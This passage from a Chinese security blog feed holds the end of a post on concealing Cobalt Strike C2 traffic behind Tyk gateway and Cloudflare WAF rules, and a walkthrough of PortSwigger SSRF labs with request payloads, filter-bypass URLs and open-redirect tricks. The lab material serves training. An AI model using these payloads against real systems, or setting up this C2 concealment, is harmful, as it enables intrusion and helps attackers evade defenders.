</span><br><span class="line">http-post &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="builtin-name">set</span> uri <span class="string">&quot;/api/v2/status&quot;</span>;</span><br><span class="line">    </span><br><span class="line">   <span class="built_in"> client </span>&#123;</span><br><span class="line">        header <span class="string">&quot;Authorization&quot;</span> <span class="string">&quot;Basic dGVzdDp0ZXN0dGVzdHRlc3Q=&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">   <span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;</span><br><span class="line">    <span class="builtin-name">set</span> uri_x86 <span class="string">&quot;/api/v2/GetProfilePicture&quot;</span>;</span><br><span class="line">    <span class="builtin-name">set</span> uri_x64 <span class="string">&quot;/api/v2/GetAttachment&quot;</span>;</span><br><span class="line">    </span><br><span class="line">   <span class="built_in"> client </span>&#123;</span><br><span class="line">        header <span class="string">&quot;Authorization&quot;</span> <span class="string">&quot;Basic dGVzdDp0ZXN0dGVzdHRlc3Q=&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h3><p>此时直接访问我们设置的API的地址都是需要验证的，而CS是可以正常上线的。</p><img src="https://s2.loli.net/2022/08/25/SvRAo7Zy4WBIYxT.png" alt="img" style="zoom:67%;" /><h2 id="0x04-配置CloudFlare防火墙"><a href="#0x04-配置CloudFlare防火墙" class="headerlink" title="0x04 配置CloudFlare防火墙"></a>0x04 配置CloudFlare防火墙</h2><h3 id="获得tyk-io特征"><a href="#获得tyk-io特征" class="headerlink" title="获得tyk.io特征"></a>获得tyk.io特征</h3><p>在CF的<code>WAF</code>中创建一条防火墙规则，如下：</p><img src="https://s2.loli.net/2022/08/25/e5ZWfulg9JhKOY2.png" alt="image-20220825184109796" style="zoom:67%;" /><p>然后生成一个木马尝试上线CS，这时肯定是无法上线的，来到CF的概述中可以看到所有拦截记录，点击单条拦截记录查看详细。</p><img src="https://s2.loli.net/2022/08/25/5X98QebcMgPF2Yv.png" alt="image-20220825184546311" style="zoom:67%;" /><p>这里有很多的特征可以加到<code>WAF</code>拦截规则中，来实现只有<code>Tyk Gateway API</code>转发过来的流量才能允许访问，其他的流量都会阻止。</p><h3 id="编辑防火墙规则"><a href="#编辑防火墙规则" class="headerlink" title="编辑防火墙规则"></a>编辑防火墙规则</h3><p>这里我以<code>ASN</code>为例子，配置如下：</p><img src="https://s2.loli.net/2022/08/25/wodcvM8ufmgTYWQ.png" alt="image-20220825184917062" style="zoom:67%;" /><p>保存防火墙规则即可。</p><h2 id="0x05-最终效果"><a href="#0x05-最终效果" class="headerlink" title="0x05 最终效果"></a>0x05 最终效果</h2><p>对服务器的扫描，无法获取到我们的beacon stage。</p><img src="https://s2.loli.net/2022/08/26/rNz75bAiwQtkERq.png" alt="image-20220826100459907" style="zoom:67%;" /><p>直接访问设置的Tyk Gateway API的地址是需要验证的。</p><img src="https://s2.loli.net/2022/08/25/1W3mjGpAMBswySF.png" alt="image-20220825185304275" style="zoom:67%;" /><p>直接访问我们的C2域名会被CloudFlare拦截。</p><img src="https://s2.loli.net/2022/08/25/KUnbLxXzH5ECNvp.png" alt="image-20220825185438993" style="zoom:67%;" /><p>CS创建监听器，如下：</p><img src="https://s2.loli.net/2022/08/26/m6KodZ7iqONzRXL.png" alt="image-20220826103524466" style="zoom: 67%;" /><p>CS生成木马，可以正常上线和执行命令。</p><img src="https://s2.loli.net/2022/08/25/1igUo76aJxB4IM5.png" alt="image-20220825185815180" style="zoom:67%;" /><h2 id="0x05-问题"><a href="#0x05-问题" class="headerlink" title="0x05 问题"></a>0x05 问题</h2><ul><li><p>由于流量经过多次转发，上线可能会有延迟。</p></li><li><p>通过配置Tyk Gateway API的域名，使用HTTPS的方式上线，流量中会出现<code>*.tyk.io</code>的DNS流量记录，算是一个比较明显的特征。</p></li></ul><img src="https://s2.loli.net/2022/08/26/osOVWLZK19bT8mw.png" alt="image-20220826105306705" style="zoom:67%;" /><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ul><li><p><a href="https://shells.systems/oh-my-api-abusing-tyk-cloud-api-management-service-to-hide-your-malicious-c2-traffic/">Oh my API, abusing TYK cloud API management to hide your malicious C2 traffic</a></p></li><li><p><a href="https://www.freebuf.com/articles/others-articles/247115.html">cobaltstrike配置nginx反向代理</a></p></li><li><p><a href="https://github.com/threatexpress/cs2modrewrite">cs2modrewrite</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cobalt Strike </tag>
            
            <tag> Hiding C2 Traffic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PortSwigger Web Security Academy-SSRF</title>
      <link href="/2022/07/21/PortSwigger-Web-Security-Academy-SSRF/"/>
      <url>/2022/07/21/PortSwigger-Web-Security-Academy-SSRF/</url>
      
        <content type="html"><![CDATA[<h2 id="SSRF简介"><a href="#SSRF简介" class="headerlink" title="SSRF简介"></a>SSRF简介</h2><p><strong>SSRF</strong>（Server-Side Request Forgery，服务器端请求伪造），漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。因此存在SSRF漏洞的服务器通常被作为跳板机来取得外网或内网其它应用服务器的信息。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p><p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p><h2 id="常见的-SSRF-攻击"><a href="#常见的-SSRF-攻击" class="headerlink" title="常见的 SSRF 攻击"></a>常见的 SSRF 攻击</h2><p><strong>SSRF 攻击通常利用信任关系来升级易受攻击的应用程序的攻击并执行未经授权的操作。</strong>这些信任关系可能与服务器本身有关，也可能与同一组织内的其他后端系统有关。</p><h3 id="针对服务器本身的SSRF攻击"><a href="#针对服务器本身的SSRF攻击" class="headerlink" title="针对服务器本身的SSRF攻击"></a>针对服务器本身的SSRF攻击</h3><p>在针对服务器本身的 SSRF 攻击中，攻击者诱使应用程序通过其环回网络接口向托管应用程序的服务器发出 HTTP 请求。这通常涉及提供带有主机名的 URL，例如<code>127.0.0.1</code>（指向环回适配器的保留 IP 地址）或<code>localhost</code>（同一适配器的常用名称）。</p><p>例如，考虑一个购物应用程序，它允许用户查看某项商品是否在特定商店中有库存。要提供库存信息，应用程序必须查询各种后端 REST API，具体取决于相关产品和商店。该功能是通过前端 HTTP 请求将 URL 传递给相关的后端 API 端点来实现的。因此，当用户查看商品的库存状态时，他们的浏览器会发出如下请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/product/stock</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>118</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">stockApi</span>=http://stock.weliketoshop.net:<span class="number">8080</span>/product/stock/check%<span class="number">3</span>FproductId%<span class="number">3</span>D<span class="number">6</span>%<span class="number">26</span>storeId%<span class="number">3</span>D<span class="number">1</span></span></span><br></pre></td></tr></table></figure><p>这会导致服务器向指定的 URL 发出请求，检索库存状态并将其返回给用户。</p><p>在这种情况下，攻击者可以修改请求以指定服务器本身的本地 URL。例如：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/product/stock</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>118</span><br><span class="line"></span><br><span class="line"><span class="awk">stockApi=http:<span class="regexp">//</span>localhost/admin</span></span><br></pre></td></tr></table></figure><p>在这里，服务器将获取<code>/admin</code>URL 的内容并将其返回给用户。</p><p>当然，攻击者可以直接访问<code>/admin</code>URL。但管理功能通常只有经过身份验证的合适用户才能访问。因此，直接访问 URL 的攻击者不会看到任何感兴趣的内容。但是，当对<code>/admin</code>URL 的请求来自本地机器本身时，会绕过正常的<a href="https://portswigger.net/web-security/access-control">访问控制。</a>应用程序授予对管理功能的完全访问权限，因为该请求似乎来自受信任的位置。</p><h3 id="针对其他后端系统的-SSRF-攻击"><a href="#针对其他后端系统的-SSRF-攻击" class="headerlink" title="针对其他后端系统的 SSRF 攻击"></a>针对其他后端系统的 SSRF 攻击</h3><p>服务器端请求伪造经常出现的另一种类型的信任关系是应用程序服务器能够与用户无法直接访问的其他后端系统进行交互。这些系统通常具有不可路由的私有 IP 地址。由于后端系统通常受到网络拓扑的保护，因此它们通常具有较弱的安全态势。在许多情况下，内部后端系统包含敏感功能，任何能够与系统交互的人无需身份验证即可访问这些功能。</p><p>在前面的示例中，假设后端 URL 有一个管理界面<code> https://192.168.0.68/admin</code>。在这里，攻击者可以通过提交以下请求，利用 SSRF 漏洞访问管理界面：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/product/stock</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>118</span><br><span class="line"></span><br><span class="line"><span class="awk">stockApi=http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.68</span>/admin</span></span><br></pre></td></tr></table></figure><h2 id="针对本地服务器的基本SSRF"><a href="#针对本地服务器的基本SSRF" class="headerlink" title="针对本地服务器的基本SSRF"></a>针对本地服务器的基本SSRF</h2><h3 id="靶场地址"><a href="#靶场地址" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost">web-security/ssrf/lab-basic-ssrf-against-localhost</a></p><h3 id="靶场说明"><a href="#靶场说明" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p><p>要完成这个实验，请更改库存检查 URL 以访问管理界面<code>http://localhost/admin</code>并删除用户<code>carlos</code>。</p><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>1、浏览<code>/admin</code>并观察您无法直接访问管理页面。</p><p><img src="https://s2.loli.net/2022/07/20/6pzPSZRtXUT81AO.png"></p><p>2、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。</p><p><img src="https://s2.loli.net/2022/07/20/PR3dI6cXVeOJsQo.png"></p><p><img src="https://s2.loli.net/2022/07/20/Nu3VzDg9avWqXj2.png"></p><p>3、将<code>stockApi</code>参数中 的 URL 更改为<code>http://localhost/admin</code>。发送请求包后能看到管理界面。</p><p><img src="https://s2.loli.net/2022/07/20/v6cwAsStLm4yDRO.png"></p><p>4、读取HTML识别删除目标用户的URL，即：<code>http://localhost/admin/delete?username=carlos</code></p><p><img src="https://s2.loli.net/2022/07/20/Ypk2GVzy71fKm4E.png"></p><p>5、成功删除carlos用户。</p><p><img src="https://s2.loli.net/2022/07/20/oWeSXncfQGgdxbu.png"></p><p><img src="https://s2.loli.net/2022/07/20/SAGZUvFY41kD2OX.png"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>为什么应用程序会以这种方式运行，并且缺省信任来自本地计算机的请求？这可能由于各种原因而出现：</p><ul><li>访问控制检查可能在位于应用程序服务器前面的不同组件中实现。 <strong>当与服务器本身建立连接时，会绕过检查。</strong></li><li>出于灾难恢复的目的，<strong>应用程序可能允许来自本地计算机的任何用户在不登录的情况下进行管理访问</strong>。这为管理员提供了一种在丢失凭据时恢复系统的方法。这里的假设是只有完全信任的用户会直接来自服务器本身。</li><li>管理界面可能正在侦听与主应用程序不同的端口号，因此用户可能无法直接访问。</li></ul><p>这种信任关系（来自本地机器的请求的处理方式与普通请求不同）通常是使 SSRF 成为严重漏洞的原因。</p><h2 id="针对其他后端系统的-SSRF-攻击-1"><a href="#针对其他后端系统的-SSRF-攻击-1" class="headerlink" title="针对其他后端系统的 SSRF 攻击"></a>针对其他后端系统的 SSRF 攻击</h2><h3 id="靶场地址-1"><a href="#靶场地址-1" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system">web-security/ssrf/lab-basic-ssrf-against-backend-system</a></p><h3 id="靶场说明-1"><a href="#靶场说明-1" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p><p>要完成实验，请使用库存检查功能<code>192.168.0.X</code>在端口 8080 上扫描管理界面的内部范围，然后使用它删除用户<code>carlos</code>。</p><h3 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>简单点说就是上一个实验+爆破url</p><p>1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送给 Burp Intruder。</p><p>2、先清除标记，然后将<code>stockApi</code>参数中的url更改为<code>http://192.168.0.1:8080/admin</code>，并标记IP地址的最后一位，即标记“1”。</p><p><img src="https://s2.loli.net/2022/07/20/of5wsKZhJTQilXC.png"></p><p>3、切换到 Payloads 选项，将Payload类型更改为 Numbers，并在“From”和“To”和“Step”框中分别输入 1、255 和 1。</p><p><img src="https://s2.loli.net/2022/07/20/ihI1bAo528JYNUd.png"></p><p>4、开始攻击。单击“Status”列按状态码升序对其进行排序。您应该看到一个状态为 200 的条目，显示一个管理界面。</p><p><img src="https://s2.loli.net/2022/07/20/LUaczrjxIiBQ2gq.png"></p><p>5、现在我们知道管理地址为192.168.1.252/admin。单击此请求，将其发送到 Repeater，并将路径更改为：<code>/admin/delete?username=carlos</code>，即可删除<code>carlos</code>用户。</p><p><img src="https://s2.loli.net/2022/07/20/QBJK1U8lwqLmP4i.png"></p><h2 id="常见的-SSRF-防御绕过"><a href="#常见的-SSRF-防御绕过" class="headerlink" title="常见的 SSRF 防御绕过"></a>常见的 SSRF 防御绕过</h2><p>通常会看到包含 SSRF 行为的应用程序以及旨在防止恶意利用的防御措施。通常，可以绕过这些防御措施。</p><ul><li><p>绕过基于黑名单的 SSRF防御措施</p></li><li><p>绕过基于白名单的SSRF防御措施</p></li><li><p>通过开放重定向绕过SSRF防御措施</p></li></ul><h2 id="基于黑名单的SSRF防御措施绕过"><a href="#基于黑名单的SSRF防御措施绕过" class="headerlink" title="基于黑名单的SSRF防御措施绕过"></a>基于黑名单的SSRF防御措施绕过</h2><p>一些应用程序会阻止包含诸如<code>127.0.0.1</code>、<code>localhost</code>之类的主机名或诸如<code>/admin</code>之类的url，在这种情况下，您通常可以使用各种技术绕过过滤器：</p><ul><li>使用替代 IP 表示<code>127.0.0.1</code>，例如<code>2130706433</code>、<code>017700000001</code>或<code>127.1</code>。</li><li>将您自己的域名解析为<code>127.0.0.1</code>. 您可以<code>spoofed.burpcollaborator.net</code>用于此目的。</li><li>使用 URL 编码或大小写变体混淆被阻止的字符串。</li></ul><h3 id="靶场地址-2"><a href="#靶场地址-2" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter">web-security/ssrf/lab-ssrf-with-blacklist-filter</a></p><h3 id="靶场说明-2"><a href="#靶场说明-2" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p><p>要完成实验，请更改库存检查 URL 以访问管理界面<code>http://localhost/admin</code>并删除用户<code>carlos</code>。</p><p>开发人员部署了两个需要绕过的SSRF 弱防御措施。</p><h3 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。将<code>stockApi</code>参数中 的 URL 更改为<code>http://127.0.0.1/</code>，观察到请求被阻止。</p><p><img src="https://s2.loli.net/2022/07/20/9GVIfWYCJvoRl8p.png"></p><p>2、通过将 URL 更改为：<code>http://localhost/</code>,还是被防火墙拦截了!</p><p><img src="https://s2.loli.net/2022/07/20/gU8ZfXyls3DIM1T.png"></p><p>3、通过双 URL 编码将<code>a</code>混淆为 <code>%25%36%31</code>,此时为<code>http://loc%25%36%31lhost/</code>。防火墙未拦截，成功以管理员身份访问系统。</p><p><img src="https://s2.loli.net/2022/07/20/DIlsn7wHzvSxGKR.png"></p><p>4、搜索管理面板url</p><p><img src="https://s2.loli.net/2022/07/20/bJKO8hWygCVB1a5.png"></p><p>5、访问管理面板</p><p><img src="https://s2.loli.net/2022/07/20/N8e7TJIXoyVauBK.png"></p><p>6、又拦截了，再次将admin中的<code>a</code>url编码两次提交,绕过防火墙!</p><p><img src="https://s2.loli.net/2022/07/20/wQOf8Emn6P4rdyu.png"></p><p>7、删除carlos账户</p><p><img src="https://s2.loli.net/2022/07/20/XfptgY2mdOKSWjz.png"></p><p>8、验证一下看是不是删除掉了，目前只剩下一个账户,成功删除carlos,实验完成.</p><p><img src="https://s2.loli.net/2022/07/20/N5t6hrVaTOfo42e.png"></p><h2 id="基于白名单的-SSRF防御措施"><a href="#基于白名单的-SSRF防御措施" class="headerlink" title="基于白名单的 SSRF防御措施"></a>基于白名单的 SSRF防御措施</h2><p>某些应用程序只允许匹配、或包含允许值的白名单的输入。在这种情况下，您有时可以通过利用 URL 解析中的不一致来绕过过滤器。</p><p>URL 规范包含许多在实现 URL的即时解析和验证时容易被忽视的特性：</p><ul><li>您可以使用<code>@</code>字符 在主机名之前的 URL 中嵌入凭据。例如：<code>https://expected-host@evil-host</code></li><li>您可以使用<code>#</code>字符来指示 URL 片段。例如：<code>https://evil-host#expected-host</code></li><li>您可以利用 DNS 命名层次结构将所需的输入放入您控制的完全限定的 DNS 名称中。例如：<code>https://expected-host.evil-host</code></li><li>您可以对字符进行 URL 编码以混淆 URL 解析代码。如果实现过滤器的代码处理 URL 编码字符的方式不同于执行后端 HTTP 请求的代码，这将特别有用。</li><li>您可以一起使用这些技术的组合。</li></ul><h3 id="靶场地址-3"><a href="#靶场地址-3" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter">web-security/ssrf/lab-ssrf-with-whitelist-filter</a></p><h3 id="靶场说明-3"><a href="#靶场说明-3" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p><p>要完成实验，请更改库存检查 URL 以访问管理界面<code>http://localhost/admin</code>并删除用户<code>carlos</code>。</p><p><strong>开发人员已经部署了您需要绕过的反 SSRF 防御。</strong></p><h3 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h3><p>1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。</p><p>将<code>stockApi</code>参数中 的 URL 更改为<code>http://127.0.0.1/</code>并观察应用程序正在解析 URL、提取主机名并根据白名单对其进行验证。</p><p><img src="https://s2.loli.net/2022/07/20/L7lOQnhRy49VAja.png"></p><p>2、将 URL 更改为<code>http://username@stock.weliketoshop.net/</code>并观察它是否被接受，这表明 URL 解析器支持嵌入式凭据。</p><p><img src="https://s2.loli.net/2022/07/20/FZI8wMgnGbPoixC.png"></p><p>3、将<code>#</code>附加到用户名后并观察到该 URL 现在被拒绝。</p><p><img src="https://s2.loli.net/2022/07/20/CZVYM1XjwbWRsNt.png"></p><p>4、双 URL 编码<code>#</code>为<code>%2523</code>，并观察到响应，表明服务器已经访问localhost。</p><p><img src="https://s2.loli.net/2022/07/20/wL82XeydGsgpqUW.png"></p><p>5、改成如下url:访问到admin页面</p><p><img src="https://s2.loli.net/2022/07/20/13UBzIgY5oVGxvn.png"></p><p>6、要访问管理界面并删除目标用户，请将 URL 更改为：<code>http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos</code></p><p><img src="https://s2.loli.net/2022/07/20/AhlNIv48S92Mcrm.png"></p><h2 id="通过开放重定向漏洞绕过的-SSRF防御"><a href="#通过开放重定向漏洞绕过的-SSRF防御" class="headerlink" title="通过开放重定向漏洞绕过的 SSRF防御"></a>通过开放重定向漏洞绕过的 SSRF防御</h2><p>有时可以通过利用开放重定向漏洞来绕过任何类型的基于过滤器的防御。</p><p>在前面的 SSRF 示例中，假设用户提交的 URL 经过严格验证，以防止恶意利用 SSRF 行为。但是，允许 URL 的应用程序包含一个开放重定向漏洞。如果用于发出后端 HTTP 请求的 API 支持重定向，则您可以构造一个满足过滤器的 URL 并导致重定向请求到所需的后端目标。</p><p>例如，假设应用程序包含一个开放重定向漏洞，其中URL如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/product/nextProduct?currentProductId=6&amp;path=http://evil-user.net</span><br></pre></td></tr></table></figure><p>返回重定向到：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>evil-user.net</span><br></pre></td></tr></table></figure><p>您可以利用开放重定向漏洞绕过URL过滤器，利用SSRF漏洞如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/product/stock</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>118</span><br><span class="line"></span><br><span class="line"><span class="awk">stockApi=http:<span class="regexp">//</span>weliketoshop.net<span class="regexp">/product/</span>nextProduct?currentProductId=<span class="number">6</span>&amp;path=http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.68</span>/admin</span></span><br></pre></td></tr></table></figure><p>这个 SSRF 漏洞利用有效，因为应用程序首先验证<code>stockAPI</code>提供的URL 是否在允许的域上，它就是。然后应用程序请求提供的 URL，这会触发打开重定向。它遵循重定向，并向攻击者选择的内部 URL 发出请求。</p><h3 id="靶场地址-4"><a href="#靶场地址-4" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection">web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection</a></p><h3 id="靶场说明-4"><a href="#靶场说明-4" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p><p>要完成实验，请更改库存检查 URL 以访问管理界面<code>http://192.168.0.12:8080/admin</code>并删除用户<code>carlos</code>。</p><p>库存检查器已被限制为只能访问本地应用程序，因此您需要首先找到影响应用程序的开放重定向漏洞。</p><h3 id="实验思路-1"><a href="#实验思路-1" class="headerlink" title="实验思路"></a>实验思路</h3><p>1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。</p><p>尝试篡改<code>stockApi</code>参数，观察到无法让服务器直接向不同的主机发出请求。</p><p><img src="https://s2.loli.net/2022/07/20/DxULHK7S6ocXd9J.png"></p><p>2、点击“下一个产品”，观察<code>path</code>参数被放入重定向响应的Location头中，导致开放重定向。</p><p><img src="https://s2.loli.net/2022/07/20/f2eQm8MokCt1xUW.png"></p><p>3、创建一个利用开放重定向漏洞的 URL，并重定向到管理界面，并将其输入到库存检查器的<code>stockApi</code>参数中。构造payload如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/product/</span>nextProduct?path=http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.12</span>:<span class="number">8080</span>/admin</span><br></pre></td></tr></table></figure><p>   观察库存检查器是否遵循重定向并向您显示管理页面。</p><p><img src="https://s2.loli.net/2022/07/20/1TCabPfhIMFEZs8.png"></p><p>4、修改路径以删除目标用户：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/product/</span>nextProduct?path=http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.12</span>:<span class="number">8080</span><span class="regexp">/admin/</span><span class="keyword">delete</span>?username=carlos</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/07/20/OMnjRNU8lph9dxD.png"></p><p>成功删除carlos,完成实验。</p><h2 id="盲-SSRF-漏洞"><a href="#盲-SSRF-漏洞" class="headerlink" title="盲 SSRF 漏洞"></a>盲 SSRF 漏洞</h2><p>盲 SSRF 通常更难利用，但有时会导致在服务器或其他后端组件上完全远程执行代码。</p><h3 id="什么是盲-SSRF？"><a href="#什么是盲-SSRF？" class="headerlink" title="什么是盲 SSRF？"></a>什么是盲 SSRF？</h3><p>当可以诱导应用程序向提供的 URL 发出后端 HTTP 请求，但后端请求的响应未在应用程序的前端响应中返回时，就会出现盲 SSRF 漏洞。</p><h3 id="盲-SSRF-漏洞的影响是什么？"><a href="#盲-SSRF-漏洞的影响是什么？" class="headerlink" title="盲 SSRF 漏洞的影响是什么？"></a>盲 SSRF 漏洞的影响是什么？</h3><p>盲 SSRF 漏洞的影响通常低于完全知情的 SSRF 漏洞，因为它们具有单向性。不能轻易利用它们从后端系统检索敏感数据，尽管在某些情况下可以利用它们来实现完整的远程代码执行。</p><h3 id="如何发现和利用盲-SSRF-漏洞"><a href="#如何发现和利用盲-SSRF-漏洞" class="headerlink" title="如何发现和利用盲 SSRF 漏洞"></a>如何发现和利用盲 SSRF 漏洞</h3><p>检测盲 SSRF 漏洞最可靠的方法是使用带外 ( <a href="https://portswigger.net/burp/application-security-testing/oast">OAST</a> ) 技术。这涉及尝试向您控制的外部系统触发 HTTP 请求，并监视与该系统的网络交互。</p><p>使用带外技术最简单、最有效的方法是使用<a href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a>。您可以使用<a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator 客户端</a>生成唯一的域名，将它们以有效负载的形式发送到应用程序，并监视与这些域的任何交互。如果观察到来自应用程序的传入 HTTP 请求，那么它很容易受到 SSRF 的攻击。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">提示:</span><br><span class="line">在测试 SSRF 漏洞时，通常会观察到对提供的 Collaborator 域的<span class="built_in"> DNS </span>查找，但没有后续的 HTTP 请求。这通常是因为应用程序试图向域发出 HTTP 请求，这导致了初始<span class="built_in"> DNS </span>查找，但实际的 HTTP 请求被网络级过滤阻止。基础设施允许出站<span class="built_in"> DNS </span>流量是相对常见的，因为有很多目的都需要这样做，但会阻止与意外目的地的 HTTP 连接。</span><br></pre></td></tr></table></figure><h3 id="带外检测的盲SSRF"><a href="#带外检测的盲SSRF" class="headerlink" title="带外检测的盲SSRF"></a>带外检测的盲SSRF</h3><p>简单地识别可以触发带外 HTTP 请求的盲<a href="https://portswigger.net/web-security/ssrf">SSRF 漏洞</a>本身并不能提供可利用的途径。由于您无法查看来自后端请求的响应，因此无法使用该行为来探索应用程序服务器可以访问的系统上的内容。但是，仍然可以利用它来探测服务器本身或其他后端系统上的其他漏洞。您可以盲目地扫描内部 IP 地址空间，发送旨在检测已知漏洞的有效负载。如果这些有效载荷还采用了盲带外技术，那么您可能会在未打补丁的内部服务器上发现一个严重漏洞。</p><h3 id="靶场地址-5"><a href="#靶场地址-5" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a href="https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection">portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection</a></p><h3 id="靶场说明-5"><a href="#靶场说明-5" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该站点使用分析软件，该软件在加载产品页面时获取Referer 标头中指定的URL。</p><p>要解决实验室问题，请使用此功能向公共 Burp Collaborator 服务器发出 HTTP 请求。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">注意事项:</span></span><br><span class="line">为了防止 Academy 平台被用于攻击第三方，我们的防火墙阻止了实验室与任意外部系统之间的交互。要解决实验室，您必须使用 Burp Collaborator 的默认公共服务器。</span><br></pre></td></tr></table></figure><h3 id="实验步骤-3"><a href="#实验步骤-3" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>1、在<a href="https://portswigger.net/burp/pro">Burp Suite Professional</a>中，转到 Burp 菜单并启动<a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator 客户端</a>。</p><p><img 